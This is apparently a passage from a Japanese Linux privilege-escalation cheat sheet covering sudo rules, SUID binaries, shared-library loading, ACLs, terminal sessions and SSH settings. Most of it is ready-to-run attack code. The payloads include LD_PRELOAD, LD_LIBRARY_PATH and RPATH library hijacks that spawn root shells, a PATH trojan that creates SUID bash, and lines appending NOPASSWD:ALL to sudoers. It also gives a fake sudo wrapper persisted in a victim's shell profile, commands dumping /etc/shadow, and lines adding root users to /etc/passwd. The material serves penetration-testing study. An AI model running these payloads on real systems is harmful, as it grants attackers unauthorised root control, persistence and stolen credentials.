特定の sudo ルールで環境変数が保持される場合、Terraform の変数は `TF_VAR_<name>` 環境変数で指定できます。source-symlink の **read** による影響を得るには、リンクをたどり、保護された結果を呼び出し元が読み取り可能な宛先にコピーする provider も必要です。destination-symlink への **write** には、別途、呼び出し元が制御できる宛先エントリと、書き込み時にリンクをたどる特権 provider が必要です。後から実行されるスケジュール済みジョブは、起こり得る影響の一例にすぎません。いずれかの経路を試す前に、`sudo -l`、`stat`、`readlink` などの読み取り専用コマンドで、sudo の許可内容、関連する `.tf` ファイル、選択された CLI config、パスの所有者を確認してください。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い字句的検証では、シンボリックリンクは解決されません:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform はシンボリックリンクを解決し、実体である `/root/root.txt` を攻撃者が読み取り可能な保存先にコピーします。同じ方法を使って、特権パスへの**書き込み**も可能です（例：provider の保存先パスを `/etc/cron.d/` 内に向けるシンボリックリンクを事前に作成する）。

### requiretty / !requiretty

古いディストリビューションの一部では、sudo を対話型 TTY からのみ実行するよう強制する `requiretty` が設定されている場合があります。`!requiretty` が設定されている場合（またはこのオプションがない場合）、reverse shells、cron jobs、スクリプトなどの非対話型コンテキストから sudo を実行できます。

```bash
Defaults !requiretty
```

これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY がなくても sudo ルールを悪用できる状況を広げます。

### sudo env_keep+=PATH / 安全でない secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示される場合、または `secure_path` に攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）が含まれる場合、sudo で許可された対象内のコマンド名にパスが指定されていない外部コマンドを、別のコマンドで置き換えられる可能性があります。<sup>[[3]](#references)</sup> 有効な `secure_path` が設定されていない場合も、sudo 実行環境で呼び出し元が制御する `PATH` が保持されているなら確認が必要です。設定がないことだけでは、保持されているとは断定できません。実行せずに許可されたスクリプトを読み、正確な RunAs と引数のルール、有効なコマンド検索パス、およびコマンド名を含む、検索順が先で書き込みとアクセスが可能なディレクトリを確認してください。認証、`NOEXEC`、シェル組み込みコマンド、絶対パス指定によって結果が変わることがあります。

- 要件: パスを指定せずにコマンド（`free`、`df`、`ps` など）を呼び出すスクリプト／バイナリを実行する sudo ルール（多くの場合 `NOPASSWD`）と、検索順が先に来る書き込み可能な PATH エントリ。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo実行時のパス回避
**移動して**他のファイルを読み込むか、**symlinks**を使用します。たとえば sudoersファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**wildcard**が使用されている場合（\*）、さらに簡単です：

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定しない Sudo コマンド/SUID バイナリ

単一のコマンドに対して**sudo 権限**が与えられていて、**パスが指定されていない**場合（_hacker10 ALL= (root) less_）、PATH 変数を変更することでこれを悪用できます。

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

この手法は、**suid** バイナリが **パスを指定せずに別のコマンドを実行する場合にも使えます（不審な SUID バイナリの内容は、必ず** _**strings**_ **で確認してください）**。

[実行する Payload の例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### コマンドのパスを指定する SUID バイナリ

**suid** バイナリが **パスを指定して別のコマンドを実行する場合**、そのファイルが呼び出すコマンド名で**関数を export** してみてください。

たとえば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、関数を作成して export します。

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

次に、SUID binary を呼び出すと、この関数が実行されます

### カスタム SUID copy wrapper

ソースと宛先のパスを受け取る root 所有の SUID ユーティリティは、2つの異なる信頼境界を越える可能性があります。どちらかの引数からシェルコマンドを組み立てる場合（たとえば、組み立てた `cp` コマンドを `system()` に渡す場合）、シェルのメタ文字によって実効権限で別のコマンドが実行される可能性があります。シェルを介さず安全に `cp` を呼び出す場合でも、宛先に制限がなければ、`/etc/passwd` のようなファイルへの特権付きの任意書き込みが可能になることがあります。wrapper の引数処理、実効 UID の動作、宛先の制限、コピーされるファイルの内容を呼び出し側が制御できるかどうかを確認してください。一般的な `cp` のエラーや SUID bit があるだけでは、どちらの経路も証明されません。手動テストの前に、バイナリと権限を受動的に列挙してください。

### SUID wrapper が実行する書き込み可能なスクリプト

よくあるカスタムアプリの設定ミスとして、root 所有の SUID binary wrapper がスクリプトを実行する一方、そのスクリプトは低権限ユーザーが書き込み可能になっているケースがあります。

典型的なパターン:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` が書き込み可能なら、payload コマンドを追記してから SUID wrapper を実行できます。

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

簡易チェック:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

この攻撃経路は、`/usr/local/bin` に配置されている「maintenance」／「backup」用のラッパーで特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、標準 C ライブラリ（`libc.so`）を含む他のすべてのライブラリより先に、ローダーが読み込む共有ライブラリ（.so ファイル）を1つ以上指定するために使用されます。この処理は、ライブラリの preloading と呼ばれます。

ただし、システムのセキュリティを維持し、この機能の悪用を防ぐため、特に **suid/sgid** 実行ファイルについては、システムによって次の条件が適用されます。

- 実ユーザー ID（_ruid_）と実効ユーザー ID（_euid_）が一致しない実行ファイルでは、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid が設定された実行ファイルでは、標準パスにあり、かつ suid/sgid が設定されたライブラリのみが preload されます。

`sudo` でコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、権限昇格が可能になることがあります。この設定により、`sudo` でコマンドを実行するときも **LD_PRELOAD** 環境変数が引き継がれて認識されるため、昇格した権限で任意のコードが実行される可能性があります。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** として保存する

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

次に、以下を使用して**コンパイルします**：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最後に、実行して**権限を昇格**します。

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御できる場合、ライブラリの検索先となるパスを指定できるため、同様の privesc を悪用される可能性があります。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

不自然に見えるSUID権限付きのバイナリを見つけた場合、.soファイルが正しく読み込まれているか確認するとよいでしょう。以下のコマンドを実行して確認できます。<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

たとえば、_「open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)」_ のようなエラーに遭遇した場合、exploitできる可能性があります。

これをexploitするには、たとえば _「/path/to/.config/libcalc.c」_ というCファイルを作成し、次のコードを記述します。

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限で shell を実行することで権限昇格を目指します。

上記の C ファイルを、次のコマンドで共有オブジェクト（.so）ファイルにコンパイルします:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最後に、影響を受けるSUIDバイナリを実行するとexploitが発動し、システムが侵害される可能性があります。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

書き込み可能なフォルダからライブラリを読み込むSUIDバイナリが見つかったので、必要な名前でそのフォルダにライブラリを作成しましょう:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

次のようなエラーが表示された場合、

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

つまり、生成したライブラリには `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者が悪用してローカルのセキュリティ制限を回避できる Unix バイナリをまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のリストですが、コマンドに**引数しか注入できない**ケースを対象としています。

このプロジェクトでは、制限付きシェルから脱出する、権限を昇格または維持する、ファイルを転送する、bind shell や reverse shell を起動する、その他の post-exploitation タスクを実行するといった目的で悪用できる、Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` を実行できる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo のルールを exploit する方法が見つかるか確認できます。

### Sudo トークンの再利用

**sudo にアクセスできる**もののパスワードがない場合、sudo コマンドが実行されるのを待ってからセッショントークンを乗っ取ることで、権限を昇格できます。<sup>[[18]](#references)</sup>

権限昇格の要件:

- すでにユーザー "_sampleuser_" としてシェルを取得している
- "_sampleuser_" が**過去 15 分以内に `sudo` を使って**何かを実行している（デフォルトでは、sudo トークンが有効な期間は 15 分で、その間はパスワードを入力せずに `sudo` を使えます）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` を利用できる（アップロードできる場合も含む）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` に設定すると、一時的に `ptrace_scope` を有効にできます）

これらの要件をすべて満たす場合、**次の方法で権限を昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初の exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` バイナリを作成します。これを使って**自分のセッションで sudo トークンを有効化**できます（自動的に root シェルが得られるわけではありません。`sudo su` を実行してください）:

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **2つ目のexploit** (`exploit_v2.sh`) は、_/tmp_ に **root 所有で setuid が設定された sh シェル**を作成します。

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **3つ目のexploit**（`exploit_v3.sh`）は、**sudoersファイルを作成**し、**sudoトークンを永続化して、すべてのユーザーがsudoを使えるようにします**。

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

フォルダーまたはフォルダー内に作成されたファイルに**書き込み権限**があれば、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って、ユーザーと PID を指定した sudo token を**作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合は、パスワードを知らなくても、次のコマンドで**sudo 権限を取得**できます。

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるか、またその使用方法を設定します。これらのファイルは**デフォルトでは root ユーザーと root グループのみが読み取れます**。\
**この**ファイルを**読み取れる**場合、**興味深い情報を入手できる**可能性があります。また、いずれかのファイルに**書き込める**場合、**権限昇格**が可能になります。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

書き込みが可能であれば、この権限を悪用できます。

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

これらの権限を悪用する別の方法:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD の `doas` など、`sudo` バイナリの代替ツールもあります。`/etc/doas.conf` の設定を確認することを忘れないでください。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas`でエディタやインタプリタの使用が許可されている場合は、GTFOBins形式のエスケープを確認します。

```bash
doas vim
:!/bin/sh
```

root 権限で実行可能な `doas` ルールについては、元の Python ベースの `dstat` のプラグインパスも確認する価値があります。[マニュアル](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1)と[ソース](https://github.com/dstat-real/dstat/blob/master/dstat)には、`dstat_*.py` プラグインの検索場所として `/usr/share/dstat/` と `/usr/local/share/dstat/` が記載されています。現在のユーザーが、インストール済みビルドで実際に使用される場所に書き込みおよび検索できる場合、選択したプラグインが `doas` の RunAs identity で実行される可能性があります。有効なルール、そのビルドでのプラグイン検索動作、ディレクトリおよび親ディレクトリの権限や ACL、呼び出し元がプラグインを選択できるかを確認してください。`dstat` ルールや書き込み可能なディレクトリだけでは、あくまで手がかりにすぎません。他の `dstat` 実装では異なるプラグインシステムが使われることがあります。プラグインをロードせず、メタデータを受動的に確認してください。

### Sudo Hijacking

**ユーザーが普段マシンに接続して `sudo` を使い**権限を昇格しているとわかっていて、そのユーザーのコンテキストでシェルを取得できた場合、root としてコードを実行してからユーザーのコマンドを実行する、新しい sudo 実行ファイルを**作成できます**。次にユーザーのコンテキストの `$PATH` を変更します（たとえば `.bash_profile` に新しいパスを追加します）。これにより、ユーザーが sudo を実行したときに、作成した sudo 実行ファイルが実行されます。

ユーザーが別のシェル（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にも別の例があります。

または、次のようなものを実行します。

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは、**ライブラリの検索対象となる他のフォルダを指定します**。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**つまり、システムは `/usr/local/lib` 内のライブラリを検索します**。

何らかの理由で、**ユーザーが** `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルに記載されたフォルダのいずれかに書き込み権限を持っている場合、権限昇格が可能になることがあります。\
**この設定ミスの悪用方法**については、次のページを参照してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib`を`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているため、この場所にあるプログラムによって使用されます。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

その後、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を実行して、`/var/tmp` に悪意のあるライブラリを作成します。

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilitiesは、**プロセスに利用可能なroot権限の一部を提供します**。これにより、rootの**権限がより小さく、それぞれ独立した単位に分割**されます。これらの単位はそれぞれ、プロセスに個別に付与できます。この方法では権限の全体が縮小され、悪用のリスクが低減します。\
次のページを読んで、**capabilitiesとその悪用方法について詳しく学んでください**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**「execute」ビット**により、対象ユーザーがフォルダーに「**cd**」できることを意味します。\
**「read」**ビットはユーザーが**ファイルを一覧表示**できることを意味し、**「write」**ビットはユーザーが新しい**ファイルを作成**したり、**ファイルを削除**したりできることを意味します。

## ACL

Access Control Lists（ACL）は、任意アクセス権限の二次レイヤーであり、**従来の ugo/rwx 権限を上書き**できます。これらの権限により、所有者でもグループの一員でもない特定のユーザーに権限を許可または拒否できるため、ファイルやディレクトリへのアクセス制御が強化されます。このレベルの**細かな制御により、より正確なアクセス管理が可能になります**。詳しくは[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)をご覧ください。<sup>[[19]](#references)</sup>

ユーザー「kali」にファイルの読み取りおよび書き込み権限を**付与**します。

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**システムから特定のACLを持つファイルを取得:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-ins に潜む ACL バックドア

よくある設定ミスは、`/etc/sudoers.d/` にある root 所有で mode `440` のファイルに、ACL によって低権限ユーザーの書き込みアクセスが許可されていることです。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` のような設定があれば、制限的なモードビットでも、ユーザーは sudo ルールを追記できます。

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

これは、`ls -l`だけの確認では見落としやすいため、影響の大きいACLによる永続化/privesc経路です。

## 開いているシェルセッション

ユーザー間のGNU Screenアクセスは、バージョンだけでなく、**実行中セッションの設定とACL**に依存します。[GNU Screenのドキュメント](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html)によると、multiuserサポートを有効にしてビルドする必要があります。また、`multiuser on`と`acladd`、または適切な`aclchg`による許可があれば、別のユーザーがセッションに接続できます。[マニュアルでは、ユーザー間のセッション検索にsetuid-rootも必要とされています](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)。root所有のソケットが見えることや、SUIDの`screen`バイナリがあることだけでは、rootシェルに接続できるとは限りません。これを権限昇格と判断する前に、実行中のセッションでmultiuserが有効であること、現在のユーザーに有効な入力/コマンド権限があること、そしてセッション内のシェルが特権ユーザーの権限で動作していることを確認してください。

### screenセッションの乗っ取り

**screenセッションを一覧表示する**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screenセッションの乗っ取り - ソケットの場所（システムによっては、一方がもう一方のシンボリックリンクとして公開される）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続する**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux セッションの乗っ取り

これは**古い tmux バージョン**での問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) セッションを乗っ取ることはできませんでした。

**tmux セッションを一覧表示**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket の場所（システムによっては、一方がもう一方のシンボリックリンクとして公開されます） - tmux sessions hijacking: tmux -S /tmp/dev sess ls その socket を使って一覧表示します。その socket で tmux session を開始できます...](<../../images/image (837).png>)

**セッションにアタッチする**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

例として、**HTB の Valentine box**を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

脆弱性があった歴史的な期間に、影響を受ける Debian または派生ディストリビューションの OpenSSL ビルドで生成された鍵は、乱数が予測可能な場合があります。ホストの現在のディストリビューションや、修正済みの OpenSSL バージョンだけでは、古い鍵がどのように生成されたかは判断できません。適切な過去のブラックリストと鍵の由来を使って、**対象の鍵**を確認してください。Debian の [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html)では公開鍵と `authorized_keys` の確認方法が説明されており、[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1)には OpenSSL の修正が記録されています。特権アカウントの `authorized_keys` にエントリがあっても、対応する秘密鍵を回収でき、そのアカウントに対して有効な SSH ポリシーが引き続きその鍵を受け入れる場合に限り、権限昇格の手掛かりになります。脆弱な **ホスト**鍵自体はログイン資格情報ではありません。侵害された鍵を交換し、古い鍵の認証設定を削除してください。

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。OpenSSH の上流デフォルトは `yes` ですが、ディストリビューションの設定で上書きされることがあります。
- **PubkeyAuthentication:** 公開鍵認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### ログイン制御ファイル

以下のファイルは、ログインできるユーザーやログイン方法に影響します。

- **`/etc/nologin`**: 存在する場合、root 以外のログインをブロックし、メッセージを表示します。
- **`/etc/securetty`**: root がログインできる場所を制限します（TTY の許可リスト）。
- **`/etc/motd`**: ログイン後に表示されるバナーです（環境やメンテナンスの詳細が leak する場合があります）。

### PermitRootLogin

root が ssh でログインできるかどうかを指定します。OpenSSH の上流デフォルトは `prohibit-password` ですが、ディストリビューションの設定で上書きされることがあります。指定できる値は次のとおりです。

- `yes`: root はパスワードと秘密鍵を使ってログインできます
- `without-password` または `prohibit-password`: root は秘密鍵を使う場合にのみログインできます
- `forced-commands-only`: root は秘密鍵を使い、かつコマンドのオプションが指定されている場合にのみログインできます
- `no` : ログインできません

### 信頼された SSH ユーザー証明書認証局

`TrustedUserCAKeys` は、sshd が**ユーザー**証明書への署名に信頼する公開鍵を指定します。対応する秘密 CA 鍵を低権限ユーザーが読み取れる場合は、誰が証明書を取得できるか、またどのアカウントの principal として認証できるかを確認してください。`AuthorizedPrincipalsFile` または `AuthorizedPrincipalsCommand` を使って、受け入れる名前を制限できます。どちらも設定されていない場合、証明書には対象アカウント名が含まれている必要があります。`PermitRootLogin prohibit-password` は root のパスワード認証をブロックしますが、証明書認証は引き続き許可する場合があります。鍵のパスが露出しているだけではアクセスできる証拠になりません。公開鍵と秘密鍵のペア、有効な `Match` ルール、アカウントポリシー、鍵のパスフレーズ、失効状態、受け入れられる署名アルゴリズムを確認してください。列挙結果に秘密鍵のバイト列を含めないでください。[OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys)を参照してください。

特権委譲ルールによって、現在のユーザーが鍵所有者の権限で制限のない[証明書署名コマンド（`ssh-keygen -s` など）](https://man.openbsd.org/ssh-keygen#-s)を実行できる場合は、秘密 CA 鍵を読み取れなくても利用できることがあります。許可された正確なコマンドと引数を、署名ユーザーが鍵にアクセスできるかどうか、有効な sshd 設定で信頼されている公開 CA、対象アカウントで受け入れられる principal、証明書の有効期間、およびそのアカウントのログインポリシーと照合してください。委譲された署名コマンドや信頼された CA ファイルだけでは、別のアカウントにアクセスできる証拠にはなりません。受動的な列挙中にテスト証明書へ署名しないでください。

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。ホームディレクトリに置き換えられる `%h` などのトークンを含めることができます。**絶対パス（`/` で始まるパス）**または**ユーザーのホームディレクトリからの相対パス**を指定できます。例：

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

この設定は、ユーザー「**testusername**」の**private** keyでログインしようとすると、sshがそのkeyのpublic keyを `/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にあるものと照合することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwardingを使うと、サーバー上に（passphraseなしの！）keyを置いたままにせず、**ローカルのSSH keysを使用**できます。つまり、sshで**あるホストに接続**し、そこから**最初のホストにある** **keyを使用して**、**別のホストに接続**できます。

このオプションを `$HOME/.ssh.config` に次のように設定します。

```
Host example.com
  ForwardAgent yes
```

`Host` が毎回 `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストは鍵にアクセスできます（これはセキュリティ上の問題です）。

`/etc/ssh_config` ファイルはこれらの**オプション**を**上書き**し、この設定を許可または禁止できます。\
`/etc/sshd_config` ファイルでは、キーワード `AllowAgentForwarding` によって ssh-agent forwarding を**許可**または禁止できます（デフォルトは許可）。

環境内で Agent Forwarding が設定されていることがわかった場合は、次のページを確認してください。**これを悪用して権限昇格できる可能性があります**。


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

`/etc/profile` ファイルと `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに実行される**スクリプト**です。したがって、これらのいずれかに**書き込みまたは変更ができれば、権限昇格できます**。

```bash
ls -l /etc/profile /etc/profile.d/
```

奇妙な profile script が見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OSによっては、`/etc/passwd` ファイルや `/etc/shadow` ファイルの名前が異なる場合や、バックアップが存在する場合があります。そのため、これらのファイルを**すべて探し**、**読み取り可能かどうかを確認**して、ファイル内に**ハッシュがあるか**を調べることをおすすめします。

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

まれに、`/etc/passwd`（または同等のファイル）内に**パスワードハッシュ**が見つかることがあります。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 書き込み可能な /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

次に、ユーザー hacker を追加し、生成されたパスワードを設定します。

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

または、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

